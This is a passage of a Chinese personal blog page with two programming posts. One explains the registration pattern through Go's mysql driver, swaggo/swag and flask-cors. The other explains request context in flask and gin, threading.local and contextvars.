  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func init() &#123;</span><br><span class="line">	sql.Register(&quot;mysql&quot;, &amp;MySQLDriver&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="swagger"><a href="#swagger" class="headerlink" title="swagger"></a>swagger</h1><ul>
<li><p>是什么？</p>
<p>在审计 <a target="_blank" rel="noopener" href="https://github.com/pingcap/tidb-dashboard">tidb-dashboard</a> 项目时，关注到<a target="_blank" rel="noopener" href="https://github.com/swaggo/swag">swagger</a>。</p>
<p>tidb-dashboard用swagger来提供在线的api文档服务。</p>
</li>
<li><p>服务使用者</p>
<p>  “服务使用者”，这里是tidb-dashboard</p>
<p><a target="_blank" rel="noopener" href="https://github.com/pingcap/tidb-dashboard/blob/v2022.03.31.1/pkg/swaggerserver/handler.go">tidb-dashboard</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func Handler() http.Handler &#123;</span><br><span class="line">	return httpSwagger.Handler()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果跟进方法，就会看到调用<code>swag.ReadDoc()</code>方法，这个方法就是”接口层”提供的”获取服务接口”。</p>
</li>
<li><p>接口层</p>
<p>  “接口层”就是swagger库，在 <a target="_blank" rel="noopener" href="https://github.com/swaggo/swag/blob/v1.8.1/swagger.go">swagger.go</a> 文件中</p>
<p>定义接口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Swagger is an interface to read swagger document.</span><br><span class="line">type Swagger interface &#123;</span><br><span class="line">	ReadDoc() string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提供”注册实例接口”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Register registers swagger for given name.</span><br><span class="line">func Register(name string, swagger Swagger) &#123;</span><br><span class="line">  ...</span><br><span class="line">	swags[name] &#x3D; swagger</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提供”获取服务接口”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">func ReadDoc(optionalName ...string) (string, error) &#123;</span><br><span class="line">	...</span><br><span class="line">	swag, ok :&#x3D; swags[name]</span><br><span class="line">	...</span><br><span class="line">	return swag.ReadDoc(), nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>服务提供者</p>
<p>  “服务提供者”这里是用户自己。这里用法有点特殊，tidb-dashboard仓库中没有”服务实现”相关代码，在编译tidb-dashboard项目时会生成代码。</p>
<p>生成后的代码我放在了<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/5ae3ce4940831464d43945f42c68b4c0">gist</a>。</p>
<p>可以看到它实现了Swagger接口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">type s struct&#123;&#125;</span><br><span class="line"></span><br><span class="line">func (s *s) ReadDoc() string &#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	return tpl.String()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注册接口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func init() &#123;</span><br><span class="line">	swag.Register(swag.Name, &amp;s&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>和第一个例子的区别</p>
<p>区别在于，这个例子中，”服务提供者”和”服务使用者”都是用户自己。</p>
<p>那么为什么不直接自己调自己，还经过”接口层”呢？</p>
</li>
</ul>
<h1 id="python-flask扩展"><a href="#python-flask扩展" class="headerlink" title="python flask扩展"></a>python flask扩展</h1><ul>
<li><p>是什么？</p>
<p>用户可以用flask框架的cors扩展来做跨域请求时的限制。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/corydolphin/flask-cors">插件文档</a>中的例子如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask_cors import CORS</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">CORS(app)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line">def helloWorld():</span><br><span class="line">  return &quot;Hello, cross-origin-world!&quot;</span><br></pre></td></tr></table></figure>

<p>这里”服务使用者”不需要找”接口层”要”服务实例”</p>
</li>
<li><p>接口层</p>
<p>  在<a target="_blank" rel="noopener" href="https://github.com/pallets/flask/blob/main/src/flask/scaffold.py">flask框架</a>中定义了一个函数<code>AfterRequestCallable</code>类型</p>
<p>  提供”注册实例接口”，如下，只是把函数放进了列表中</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@setupmethod</span><br><span class="line">def after_request(self, f: AfterRequestCallable) -&gt; AfterRequestCallable:</span><br><span class="line">	..</span><br><span class="line">		self.after_request_funcs.setdefault(None, []).append(f)</span><br><span class="line">		return f</span><br></pre></td></tr></table></figure>
</li>
<li><p>服务提供者</p>
<p>cors插件在flask框架基础上，提供了cors相关的安全能力。</p>
<p>  在 <a target="_blank" rel="noopener" href="https://github.com/corydolphin/flask-cors/blob/master/flask_cors/extension.py">flask_cors/extension.py</a> 中</p>
<p>  实现接口：cors_after_request函数是<code>AfterRequestCallable</code>类型具体的实现</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def make_after_request_function(resources):</span><br><span class="line">   def cors_after_request(resp):</span><br><span class="line">       ...</span><br><span class="line">       normalized_path &#x3D; unquote_plus(request.path)</span><br><span class="line">       for res_regex, res_options in resources:</span><br><span class="line">           if try_match(normalized_path, res_regex):</span><br><span class="line">               ...</span><br><span class="line">       ...</span><br><span class="line">       return resp</span><br><span class="line">   return cors_after_request</span><br></pre></td></tr></table></figure>

<p>  注册接口：在CORS实例化时，会注册实例提供安全能力</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class CORS(object):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    def __init__(self, app&#x3D;None, **kwargs):</span><br><span class="line">        ...</span><br><span class="line">        self.init_app(app, **kwargs)</span><br><span class="line"></span><br><span class="line">    def init_app(self, app, **kwargs):</span><br><span class="line">        ...</span><br><span class="line">        cors_after_request &#x3D; make_after_request_function(resources)</span><br><span class="line">        app.after_request(cors_after_request)   # 有点注册一个中间件的感觉</span><br></pre></td></tr></table></figure>
</li>
<li><p>和前面两个例子的区别</p>
<p>细品的话，可以看到这个例子和前两个例子又有很多不同：</p>
<ul>
<li>没有显式的”接口定义”，毕竟python没有接口关键字<ul>
<li>注册的是”函数”，而不是”对象”</li>
</ul>
</li>
<li>“接口层”不提供”获取服务”，”服务使用者”也不需要”获取服务”</li>
<li>由”服务使用者”注册”接口实例”，而不是”服务提供者”注册接口实例</li>
</ul>
<p>可以想一想为什么会有这些区别，能把这些区别”修改”回去吗？比如如果我是cors扩展库作者，我就不能在cors库里自动注册服务，让库的使用者少写几行代码吗？</p>
</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过分析这三个”注册模式”的例子，我自己对”面向接口编程”有点感觉。后面感觉这种思想很基础、很常见、很实用，比如rpc、spring ioc容器、微服务的服务注册等都和这个”注册模式”很像。</p>
<p>如果你觉得疑惑，或者觉得我写得比较怪，推荐你找一个你熟悉的库自己分析一下。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-04-07-web%E6%A1%86%E6%9E%B6%E7%9A%84%E8%AF%B7%E6%B1%82%E4%B8%8A%E4%B8%8B%E6%96%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-04-07-web%E6%A1%86%E6%9E%B6%E7%9A%84%E8%AF%B7%E6%B1%82%E4%B8%8A%E4%B8%8B%E6%96%87/" class="post-title-link" itemprop="url">web框架的请求上下文</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-04-07 19:45:56" itemprop="dateCreated datePublished" datetime="2022-04-07T19:45:56+08:00">2022-04-07</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-06-13 23:00:47" itemprop="dateModified" datetime="2022-06-13T23:00:47+08:00">2022-06-13</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>最近在研究web框架时，对”请求上下文”这个基础概念有了更多的了解，因此记录一下，包括以下内容：</p>
<ul>
<li>“请求上下文”是什么？</li>
<li>web框架(flask和gin)实现”请求上下文”的区别？</li>
<li>“线程私有数据”是什么？</li>
</ul>
<h1 id="学习过程"><a href="#学习过程" class="headerlink" title="学习过程"></a>学习过程</h1><ul>
<li><p>“请求上下文”是什么？</p>
<p>根据 <a target="_blank" rel="noopener" href="https://geektutu.com/post/gee-day2.html">Go语言动手写Web框架 - Gee第二天 上下文Context</a> 和 <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/418283">Context：请求控制器，让每个请求都在掌控之中</a> 两篇文章，可以知道从”框架开发者”的角度看，”请求上下文”包括：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 请求对象：包括请求方法、路径、请求头等内容</span><br><span class="line">* 响应对象：可以用来返回http响应</span><br><span class="line">* 工具函数：可以用来更方便地操作&quot;请求对象&quot;和&quot;响应对象&quot;</span><br></pre></td></tr></table></figure>

<p>那么web框架怎么让”框架的使用者”拿到”请求上下文”呢？</p>
</li>
<li><p>“框架的使用者怎么”拿到”请求上下文”？</p>
<p>flask框架中请求上下文是一个全局变量，而gin框架中请求上下文被当作参数传递。</p>
<p>根据<a target="_blank" rel="noopener" href="https://flask.palletsprojects.com/en/2.1.x/quickstart/#accessing-request-data">flask文档</a>知道request对象包含有请求信息，可以如下获取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;login&#39;, methods&#x3D;[&#39;POST&#39;, &#39;GET&#39;])</span><br><span class="line">def login():</span><br><span class="line">    ...</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;POST&#39;:</span><br><span class="line">        if valid_login(request.form[&#39;username&#39;],</span><br><span class="line">                       request.form[&#39;password&#39;]):</span><br></pre></td></tr></table></figure>

<p>根据<a target="_blank" rel="noopener" href="https://pkg.go.dev/github.com/gin-gonic/gin#section-readme">gin文档</a>知道gin.Context实例c中包含有请求信息，可以如下获取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> router :&#x3D; gin.Default()</span><br><span class="line"></span><br><span class="line">router.GET(&quot;&#x2F;welcome&quot;, func(c *gin.Context) &#123;</span><br><span class="line">	firstname :&#x3D; c.DefaultQuery(&quot;firstname&quot;, &quot;Guest&quot;)</span><br><span class="line">	lastname :&#x3D; c.Query(&quot;lastname&quot;) &#x2F;&#x2F; shortcut for c.Request.URL.Query().Get(&quot;lastname&quot;)</span><br><span class="line"></span><br><span class="line">	c.String(http.StatusOK, &quot;Hello %s %s&quot;, firstname, lastname)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>从上面的使用方法可以看出来，flask和gin框架实现”请求上下文”有一些区别：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* gin框架中&quot;框架使用者&quot;需要把&quot;请求上下文&quot;当作参数，显示地传递</span><br><span class="line">* flask框架中&quot;框架使用者&quot;只需要request这个全局变量，就能获得&quot;请求上下文&quot;</span><br></pre></td></tr></table></figure>

<p>于是就有两个问题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* flask的request是个全局变量，那&quot;基于多线程实现&quot;的服务端同时收到多个请求时，request怎么能代表当前线程处理的请求呢？</span><br><span class="line">* flask似乎对&quot;框架使用者&quot;来说更方便，毕竟不需要多传递一个参数。那为什么gin框架不也这么设计呢？</span><br></pre></td></tr></table></figure>

<p>第一个问题其实涉及到”线程私有数据”的概念</p>
</li>
</ul>
<h1 id="线程私有数据"><a href="#线程私有数据" class="headerlink" title="线程私有数据"></a>线程私有数据</h1><ul>
<li><p>是什么？</p>
<p>举个例子，下面代码中新线程看不到主线程的mydata变量，因为mydata是”主线程”和”新线程”的私有数据”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">from threading import local</span><br><span class="line"></span><br><span class="line">mydata &#x3D; local()</span><br><span class="line">mydata.number &#x3D; 42</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def f():</span><br><span class="line">    if getattr(mydata, &quot;number&quot;, None) is not None:</span><br><span class="line">        print(mydata.number)    # 这里会打印42吗？</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">thread &#x3D; threading.Thread(target&#x3D;f)</span><br><span class="line">thread.start()</span><br><span class="line">thread.join()</span><br></pre></td></tr></table></figure>
</li>
<li><p>threading.local是怎么实现的？</p>
<p>从<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/main/Lib/_threading_local.py">源码</a>中可以看到localdict是实际存放数据的对象，每个线程对应一个localdict。</p>
<p>线程在读写”线程私有数据”时，会找到自己的localdict。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class _localimpl:</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  def get_dict(self):</span><br><span class="line">      &quot;&quot;&quot;Return the dict for the current thread. Raises KeyError if none</span><br><span class="line">      defined.&quot;&quot;&quot;</span><br><span class="line">      thread &#x3D; current_thread()</span><br><span class="line">      return self.dicts[id(thread)][1]    # id(thread)是当前线程对象内存地址，每个线程应该是唯一的</span><br><span class="line"></span><br><span class="line">  def create_dict(self):</span><br><span class="line">      &quot;&quot;&quot;Create a new dict for the current thread, and return it.&quot;&quot;&quot;</span><br><span class="line">      localdict &#x3D; &#123;&#125;</span><br><span class="line">      key &#x3D; self.key</span><br><span class="line">      thread &#x3D; current_thread()</span><br><span class="line">      idt &#x3D; id(thread)    # id(thread)是当前线程对象内存地址，每个线程应该是唯一的</span><br><span class="line">      ...</span><br><span class="line">      self.dicts[idt] &#x3D; wrthread, localdict</span><br><span class="line">      return localdict</span><br><span class="line"></span><br><span class="line">  from threading import current_thread, RLock</span><br></pre></td></tr></table></figure>

<p>那flask框架是用了threading.local吗？</p>
</li>
<li><p>flask框架用了threading.local吗？</p>
<p>先说结论：flask的request对象不是基于”threading.local”，而是”contextvars.ContextVar”，后者可以实现”协程私有数据”</p>
<p>下面代码运行结果中，task1函数不会打印hello，可以看出来ContextVar是实现”协程私有数据”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from greenlet import greenlet</span><br><span class="line">from contextvars import ContextVar</span><br><span class="line">from greenlet import getcurrent as get_ident</span><br><span class="line"></span><br><span class="line">var &#x3D; ContextVar(&quot;var&quot;)</span><br><span class="line">var.set(&quot;hello&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def p(s):</span><br><span class="line">    print(s, get_ident())</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        print(var.get())</span><br><span class="line">    except LookupError:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def task1():</span><br><span class="line">    p(&quot;task1&quot;)    # 不会打印hello</span><br><span class="line">    # gr2.switch()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 测试ContextVar能否支持&quot;协程私有数据&quot;</span><br><span class="line">p(&quot;main&quot;)</span><br><span class="line">gr1 &#x3D; greenlet(task1)</span><br><span class="line">gr1.switch()</span><br><span class="line"></span><br><span class="line"># 测试ContextVar能否支持&quot;线程私有数据&quot;，结论是支持</span><br><span class="line"># import threading</span><br><span class="line"># p(&quot;main&quot;)</span><br><span class="line"># thread &#x3D; threading.Thread(target&#x3D;task1)</span><br><span class="line"># thread.start()</span><br><span class="line"># thread.join()</span><br></pre></td></tr></table></figure>

<p>从<a target="_blank" rel="noopener" href="https://github.com/pallets/flask/blob/main/src/flask/globals.py">flask/globals.py</a>中可以看到request是werkzeug库的Local类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_request_ctx_stack &#x3D; LocalStack()</span><br><span class="line">...</span><br><span class="line">request: &quot;Request&quot; &#x3D; LocalProxy(partial(_lookup_req_object, &quot;request&quot;))  # type: ignore</span><br></pre></td></tr></table></figure>

<p>而从<a target="_blank" rel="noopener" href="https://github.com/pallets/werkzeug/blob/main/src/werkzeug/local.py">werkzeug/local.py源码</a> 可以看出来werkzeug库的Local是基于contextvars.ContextVar实现的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Local:</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  def __init__(self) -&gt; None:</span><br><span class="line">      object.__setattr__(self, &quot;_storage&quot;, ContextVar(&quot;local_storage&quot;)) # 基于contextvars.ContextVar</span><br></pre></td></tr></table></figure>

<p>所以，flask并没有用threading.local，而是werkzeug库的Local类型。也因此在”多线程”或者”多协程”环境下，flask的request全局变量能够代表到当前线程或者协程处理的请求。</p>
</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>web框架让”框架使用者”拿到”请求对象”有两种方式，包括”参数传递”、”全局变量”。</p>
<p>实现”全局变量”这种方式时，因为web服务可能是在多线程或者多协程的环境，所以需要每个线程或者协程使用”全局变量”时互不干扰，就涉及到”线程私有数据”的概念。</p>
<p>SpringWeb中在使用”RequestContextHolder.getRequestAttributes()静态方法”获取请求时，也是类似的业务逻辑。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://geektutu.com/post/gee-day2.html">Go语言动手写Web框架 - Gee第二天 上下文Context</a><br><a target="_blank" rel="noopener" href="https://cizixs.com/2017/01/13/flask-insight-context/">flask 源码解析：上下文</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">leveryd</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
